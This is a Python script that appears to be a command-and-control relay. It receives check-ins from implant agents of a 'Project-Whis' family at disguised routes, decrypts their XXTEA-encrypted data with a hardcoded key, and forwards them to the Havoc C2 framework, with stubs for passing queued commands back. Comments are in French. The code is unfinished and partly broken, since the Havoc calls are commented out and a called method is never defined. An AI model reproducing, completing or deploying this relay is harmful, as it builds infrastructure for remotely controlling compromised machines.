import havoc
import base64
import json
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

# Configuration Project-Whis
ENCRYPTION_KEY = b"1234567890"

# Fonction XXTea simple (nécessite l'installation de 'xxtea' via pip)
try:
    import xxtea
except ImportError:
    print("[!] Erreur: Vous devez installer xxtea (pip install xxtea-py)")

class WhisHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        agent_id = query.get('id', [None])[0]
        
        # Route pour les paramètres/enregistrement
        if "account.html" in self.path:
            self.handle_checkin(agent_id)
        # Route pour lire les commandes
        elif "read.html" in self.path:
            self.handle_fetch_commands(agent_id)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        # Route pour l'enregistrement initial
        if "new.html" in self.path:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            data_dict = parse_qs(post_data)
            
            raw_data = data_dict.get('data', [None])[0]
            if raw_data:
                decoded = base64.urlsafe_b64decode(raw_data + '==')
                decrypted = xxtea.decrypt(decoded, ENCRYPTION_KEY)
                agent_info = json.loads(decrypted)
                
                # Enregistrement dans Havoc
                self.register_in_havoc(agent_info)
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"success")

    def register_in_havoc(self, info):
        # Ici on utilise l'API de Havoc pour créer une nouvelle session
        print(f"[*] Nouvel agent Project-Whis: {info['ID']} ({info['OS']})")
        # havoc.RegisterAgent(...) 

    def handle_fetch_commands(self, agent_id):
        # Récupérer les commandes depuis Havoc et les envoyer à l'agent
        # commands = havoc.GetQueuedCommands(agent_id)
        self.send_response(200)
        self.end_headers()
        # self.wfile.write(encrypted_command)

def run_translator():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, WhisHandler)
    print('[*] Project-Whis to Havoc Translator running on port 8080...')
    httpd.serve_forever()

if __name__ == "__main__":
    run_translator()
